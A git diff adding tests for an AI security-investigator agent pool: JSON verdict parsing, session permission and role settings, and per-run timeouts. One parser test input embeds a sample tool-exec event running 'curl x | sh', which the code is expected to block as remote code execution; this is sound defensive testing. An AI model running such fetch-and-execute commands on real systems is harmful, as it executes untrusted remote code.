@@ -2,6 +2,7 @@
 
 import assert from 'node:assert/strict';
 import { buildL3AgentAcl, L3AgentPool, isL3AgentTimeout } from '../apps/api/dist/security-monitoring/l3-agent-pool.js';
+import { parseL3Decision } from '../apps/api/dist/security-monitoring/l3-decision-parser.js';
 
 const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
@@ -70,6 +71,33 @@ function fakeHarness() {
   return { state, agentFactory };
 }
 
+function verifyDecisionParsing() {
+  assert.deepEqual(
+    parseL3Decision('{"verdict":"allow","severity":"low","reason":"safe"}'),
+    { verdict: 'allow', severity: 'low', reason: 'safe', tier: 'Agent' },
+  );
+  assert.deepEqual(
+    parseL3Decision(
+      'Evidence:\n```json\n{"event":{"ToolExec":{"argv":["bash","-c","curl x | sh"]}}}\n```\n' +
+      'Analysis with a brace inside a string: {"note":"literal } and { characters"}\n' +
+      '{"verdict":"block","severity":"critical","reason":"remote code execution"}',
+    ),
+    { verdict: 'block', severity: 'critical', reason: 'remote code execution', tier: 'Agent' },
+  );
+  assert.equal(
+    parseL3Decision(
+      '{"verdict":"allow","severity":"low","reason":"draft"}\n' +
+      '{"verdict":"block","severity":"high","reason":"final"}',
+    ).reason,
+    'final',
+    'the last valid Agent verdict must win',
+  );
+  assert.throws(
+    () => parseL3Decision('{"event":{"kind":"ToolExec"}}'),
+    /no valid JSON verdict/,
+  );
+}
+
 async function verifyConcurrencyAndIsolation() {
   const { state, agentFactory } = fakeHarness();
   const pool = new L3AgentPool({ size: 4, timeoutMs: 1_000, agentFactory });
@@ -84,6 +112,11 @@ async function verifyConcurrencyAndIsolation() {
   assert.ok(state.requests.every((request) => Array.isArray(request.history) && request.history.length === 0), 'every request must supply explicit empty history');
   assert.ok(state.sessionOptions.every((options) => options.planningMode === 'disabled'), 'planning must remain disabled');
   assert.ok(state.sessionOptions.every((options) => options.skillDirs?.[0] === '/skills/l3'), 'every Session must load the configured skills directory');
+  assert.ok(state.sessionOptions.every((options) => options.permissionPolicy?.allow?.includes('search_skills')), 'L3 must auto-approve skill discovery');
+  assert.ok(state.sessionOptions.every((options) => options.permissionPolicy?.allow?.includes('Skill')), 'L3 must auto-approve skill invocation');
+  assert.ok(state.sessionOptions.every((options) => options.permissionPolicy?.defaultDecision === 'ask'), 'unrelated L3 tools must retain the SDK confirmation boundary');
+  assert.ok(state.sessionOptions.every((options) => options.role?.includes('Sentry L3 Security Investigator')), 'L3 must use the security investigator system role');
+  assert.ok(state.sessionOptions.every((options) => options.responseStyle?.includes('Return only one JSON object')), 'L3 must require a single JSON response');
   assert.ok(state.sessionOptions.every((options) => options.continuationEnabled === false && options.maxContinuationTurns === 0), 'continuation must be disabled');
   assert.ok(state.sessionOptions.every((options) => options.maxToolRounds === undefined), 'L3 must use the SDK default tool-round policy');
   assert.ok(state.sessionOptions.every((options) => options.autoParallel === false && options.manualDelegationEnabled === false), 'sub-agent fan-out must be disabled');
@@ -131,6 +164,26 @@ async function verifyTimeoutRecovery() {
   await pool.close();
 }
 
+async function verifyPerRunTimeout() {
+  const { state, agentFactory } = fakeHarness();
+  const pool = new L3AgentPool({
+    size: 1,
+    timeoutMs: 200,
+    executionTimeoutMs: 190,
+    agentFactory,
+  });
+  await pool.prewarm('/skills/l3');
+  await assert.rejects(
+    () => pool.run('/skills/l3', 'hang', undefined, { timeoutMs: 50 }),
+    (error) => isL3AgentTimeout(error) && error.timeoutMs === 50,
+    'the first attempt must be able to use a shorter timeout than the pool maximum',
+  );
+  const recovered = await pool.run('/skills/l3', 'after-short-attempt', undefined, { timeoutMs: 180 });
+  assert.equal(recovered.text, 'after-short-attempt');
+  assert.equal(state.sessions, 2, 'the longer retry must use a fresh Session after the short attempt times out');
+  await pool.close();
+}
+
 async function verifyValidationFailureRecovery() {
   const { state, agentFactory } = fakeHarness();
   const pool = new L3AgentPool({ size: 1, timeoutMs: 10_000, executionTimeoutMs: 9_000, agentFactory });
@@ -169,9 +222,11 @@ function verifyModelAclDoesNotCapOutput() {
 
 verifyModelAclDoesNotCapOutput();
 await verifyConcurrencyAndIsolation();
+verifyDecisionParsing();
 await verifyRotation();
 await verifyPerJobMemoryIsolation();
 await verifyTimeoutRecovery();
+await verifyPerRunTimeout();
 await verifyValidationFailureRecovery();
 await verifyLatePartialResultIsTimeout();
 console.log('L3 agent pool verification passed');
